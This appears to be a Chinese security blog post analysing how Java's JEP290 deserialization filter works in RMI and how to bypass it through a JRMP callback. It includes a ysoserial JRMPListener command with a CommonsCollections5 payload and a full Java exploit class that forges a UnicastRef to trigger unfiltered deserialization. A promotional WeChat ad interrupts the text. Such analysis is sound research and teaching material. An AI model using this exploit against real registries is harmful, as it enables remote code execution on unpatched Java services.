## 0x01 前言

属于是拖了很久的文章了，4.18 筹划着开始写，6.22 左右才真正开始提笔。

一开始提到这个概念可能会比较懵逼，其实这就是为什么 **高版本 jdk 有部分能打 jndi，打不了 RMI**

8u121 ~ 8u230 打不了 RMI

## 0x02 关于 JEP290

JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事

1、提供一个限制反序列化类的机制，白名单或者黑名单。2、限制反序列化的深度和复杂度。3、为 RMI
远程调用对象提供了一个验证类的机制。4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。

官方从 8u121，7u13，6u141 分别支持了这个 JEP

## 0x03 JEP290 防御手段分析

先起一个 RMI 的服务，代码详见 ——
<https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/RMI>

尝试去攻击，这里会报错，报错部分信息为

    
    
    java.io.ObjectInputStream filterCheck  
    信息: ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler

![202307051630057.png](https://image.3001.net/images/20230706/1688604868_64a610c41cd8e47eeec4b.png!small)

可以先看一下官方文档对于 JEP290 的描述 <http://openjdk.java.net/jeps/290>

  * 我们很容易通过描述来看对应增加的 Filter 点是什么，如图找到了 `ObjectInputFilter`相关的类

![202307051630058.png](https://image.3001.net/images/20230706/1688604869_64a610c5807700b00884a.png!small)

我这里去看了看 `ObjectInputFilter`相关的类，断点是下不去的，所以去到控制台去看，发现在
`RegistryImpl_Skel`类中也存在报错现象，而这个类在 RMI 中是用来做反序列化的方法的。

![202307051630059.png](https://image.3001.net/images/20230706/1688604870_64a610c6de743db034e24.png!small)

跟进，`ObjectInputStream`类调用了 `readObject0()`方法，继续跟进

![202307051630060.png](https://image.3001.net/images/20230706/1688604872_64a610c85786f93b84bf9.png!small)

先获取输入当中 `blkmode`，如果数据为 true，则继续进行后续判断，后续做了一部分的数据处理工作，我们直接来看最重要的地方 1573 行，调用了
`checkResolve()`方法，跟进

![202307051630061.png](https://image.3001.net/images/20230706/1688604873_64a610c9aab3fddb2f6bb.png!small)

跟进 `readClassDesc()`方法，这个方法主要是读取并返回类描述符，并判断这一类描述符是否可以解析为本地 VM 中的类。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

![202307051630062.png](https://image.3001.net/images/20230706/1688604875_64a610cb0bca6b016e6c5.png!small)

在 `readClassDesc()`方法中，判断 tc 所对应的类型，这里跟进 `readProxyDesc()`方法

![202307051630063.png](https://image.3001.net/images/20230706/1688604876_64a610cc5cfb5ded805ba.png!small)

`readProxyDesc()`方法做完一系列基础判断之后调用了 `filterCheck()`方法，跟进

![202307051630064.png](https://image.3001.net/images/20230706/1688604877_64a610cd9b05e7ef8ab5e.png!small)

而 `filterCheck()`方法又调用了 `checkInput()`方法，这里应该是最终来判断输入是否合法的地方。

![202307051630065.png](https://image.3001.net/images/20230706/1688604879_64a610cf0fdab021dadfc.png!small)

这里的判断会进行两次，一个是开启 JVM 的 `java.rmi.Remote`类，另一个是我们放入的恶意利用类
`sun.reflect.annotation.AnnotationInvocationHandler`，第一次会先判断
`java.rmi.Remote`类是否合法

![202307051630066.png](https://image.3001.net/images/20230706/1688604880_64a610d08c1824345a771.png!small)

对应的判断代码，其实也就是白名单了。代码会首先判断 `var2`是否等于 `String`类型。如果不是，则继续判断它是否满足下列几个条件中的任意一个：

    
    
    return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;

而这里，我们的 `sun.reflect.annotation.AnnotationInvocationHandler`类并不在这些白名单中，所以会被过滤

![202307051630067.png](https://image.3001.net/images/20230706/1688604881_64a610d1c90ed902a2e37.png!small)

## 0x04 JEP290 绕过

这里我们可以先看一下白名单里面都能过什么，白名单如下

    
    
    String.class  
    Number.class  
    Remote.class  
    Proxy.class  
    UnicastRef.class  
    RMIClientSocketFactory.class  
    RMIServerSocketFactory.class  
    ActivationID.class  
    UID.class

这里我觉得还是得从它在 JDK8u221 的具体环境下的流程分析入手，看一下在攻击流程之后哪里可以能够被利用，哪里可以 bypass

### 绕过利用

思考了在 RMI 的流程当中，哪一步能够绕过 JEP290 的检测，最终是 JRMP 的这一步，能够绕过，从原理图来说的话应该是这样

![202307051630068.png](https://image.3001.net/images/20230706/1688604883_64a610d32be6290a0c4a2.png!small)

先用 ysoserial 开启 JRMP 3333 端口的监听

    
    
    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 "Calc"

然后编写 RMI 的 EXP

    
    
    import sun.rmi.server.UnicastRef;  
    import sun.rmi.transport.LiveRef;  
    import sun.rmi.transport.tcp.TCPEndpoint;  
    ​  
    import java.lang.reflect.InvocationTargetException;  
    import java.lang.reflect.Proxy;  
    import java.rmi.AlreadyBoundException;  
    import java.rmi.RemoteException;  
    import java.rmi.registry.LocateRegistry;  
    import java.rmi.registry.Registry;  
    import java.rmi.server.ObjID;  
    import java.rmi.server.RemoteObjectInvocationHandler;  
    import java.util.Random;  
    ​  
    public class BypassJEP290 {  
    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {  
    Registry reg = LocateRegistry.getRegistry("localhost",1099); // rmi start at 2222  
    ObjID id = new ObjID(new Random().nextInt());  
    TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333); // JRMPListener's port is 3333  
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));  
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);  
    Registry proxy = (Registry) Proxy.newProxyInstance(BypassJEP290.class.getClassLoader(), new Class[] {  
    Registry.class  
    }, obj);  
    reg.bind("Hello",proxy);  
    }  
    }

![202307051630069.png](https://image.3001.net/images/20230706/1688604884_64a610d4a9373d4829680.png!small)

这个 payload 的原理就是伪造了一个 `UnicastRef`用于跟注册中心通信，我们从 `bind()`方法开始分析一下这一整个流程。

### 绕过分析

我们通过 `getRegistry`时获得的注册中心，其实就是一个封装了 `UnicastServerRef`对象的对象

![202307051630070.png](https://image.3001.net/images/20230706/1688604886_64a610d6142e1163984bc.png!small)

当我们调用 `bind`方法后，会通过 `UnicastRef`对象中存储的信息与注册中心进行通信

![202307051630071.png](https://image.3001.net/images/20230706/1688604888_64a610d8377896fe44221.png!small)

这里会通过 ref 与注册中心通信，并将绑定的对象名称以及要绑定的远程对象发过去，注册中心在后续会对应进行反序列化

接着来看看 yso 中的 JRMPClient 是做了什么操作

    
    
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry  
    TCPEndpoint te = new TCPEndpoint(host, port);  
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));  
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);  
    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {  
    Registry.class  
    }, obj);  
    return proxy;

这里返回了一个代理对象，上面用的这些类都在白名单里，当注册中心反序列化时，会调用到`RemoteObjectInvacationHandler`父类`RemoteObject`的`readObject`方法（因为`RemoteObjectInvacationHandler`没有`readObject`方法），在`readObject`里的最后一行会调用`ref.readExternal`方法，并将`ObjectInputStream`传进去：

这里的调用栈非常长，总体上来说就是在做我上面所说的工作，调用栈如下

    
    
    readObject:455, RemoteObject (java.rmi.server)  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:62, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:498, Method (java.lang.reflect)  
    invokeReadObject:1170, ObjectStreamClass (java.io)  
    readSerialData:2178, ObjectInputStream (java.io)  
    readOrdinaryObject:2069, ObjectInputStream (java.io)  
    readObject0:1573, ObjectInputStream (java.io)  
    defaultReadFields:2287, ObjectInputStream (java.io)  
    readSerialData:2211, ObjectInputStream (java.io)  
    readOrdinaryObject:2069, ObjectInputStream (java.io)  
    readObject0:1573, ObjectInputStream (java.io)  
    readObject:431, ObjectInputStream (java.io)     // 从此处开始，会遇到很多字节码不匹配的问题  
    dispatch:92, RegistryImpl_Skel (sun.rmi.registry)  
    oldDispatch:469, UnicastServerRef (sun.rmi.server)  
    dispatch:301, UnicastServerRef (sun.rmi.server)  
    run:200, Transport$1 (sun.rmi.transport)  
    run:197, Transport$1 (sun.rmi.transport)  
    doPrivileged:-1, AccessController (java.security)  
    serviceCall:196, Transport (sun.rmi.transport)  
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)  
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)  
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)  
    run:-1, 1330984495 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)  
    doPrivileged:-1, AccessController (java.security)  
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)  
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)  
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)  
    run:748, Thread (java.lang)

一路跟进到 `sun.rmi.transport.LiveRef#read`

![202307051630072.png](https://image.3001.net/images/20230706/1688604889_64a610d9b1d02f1cc988f.png!small)

可以看到这里把 payload 里所传入的 `LiveRef`解析到 `var5`变量处，里面包含了 `ip`与 `端口`信息(JRMPListener
的端口)。这些信息将用于后面注册中心与 JRMP 端建立通信。

![202307051630073.png](https://image.3001.net/images/20230706/1688604891_64a610db212b3fb9a1a9f.png!small)

跟进 `saveRef()`方法，里面做了一个映射，其建立了一个 `TCPEndpoint`到 `ArrayList<LiveRef>`的映射关系。

![202307051630074.png](https://image.3001.net/images/20230706/1688604892_64a610dcbe6ef5db770e7.png!small)

到这里 JRMP 的通信流程基本结束了，接着再回到 `dispatch()`方法，在调用了 `readObject`方法之后调用了
`var2.releaseInputStream();`，跟进

![202307051630075.png](https://image.3001.net/images/20230706/1688604894_64a610de53467943fadfb.png!small)

`releaseInputStream()`方法调用了 `this.in.registerRefs()`方法，跟进。其中先判断了当前保存的 Ref
是否为空，再获取当前 Ref，这个 Ref 实际上就是创建的 JRMP 连接，再跟进 `registerRefs()`方法

![202307051630076.png](https://image.3001.net/images/20230706/1688604895_64a610dfd9b72f9fd0a22.png!small)

var2这里返回的是 DGCClient 对象，里边同样封装了我们的端口信息

![202307051630077.png](https://image.3001.net/images/20230706/1688604897_64a610e15254834a0afde.png!small)

接着看到 `registerRefs`方法中的 `this.makeDirtyCall(var2, var3);`，跟进一下

![202307051630078.png](https://image.3001.net/images/20230706/1688604898_64a610e2c33ce76986e85.png!small)

里面主要是做了数据处理，将原本保存了 EndPoint 的 var1 —— HashSet 数组转换为 ObjID，同时，调用了
`this.dgc.dirty()`方法，跟进。

![202307051630079.jpg](https://image.3001.net/images/20230706/1688604900_64a610e463624323320a8.jpg!small)

在 `dirty()`方法中调用 `wirteObject()`方法后，会用 `invoke()`将数据发出去。

`invoke()`方法实现的过程就是从 socket 连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置
filter（白名单），所以这里可以直接导致注册中心 rce，所以我们可以伪造一个 socket 连接并把我们恶意序列化的对象发过去，这也就是当时用
ysoserial 开启的 JRMP

![202307051630080.png](https://image.3001.net/images/20230706/1688604901_64a610e5cca132b06b49f.png!small)

至此绕过分析结束

## 0x05 小结

本身 JEP290 的绕过分析的思路是非常清晰的，但是整个流程还是比较复杂的，总结一下是从 RMI 通信的流程当中找到了可乘之机。

###  **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

  

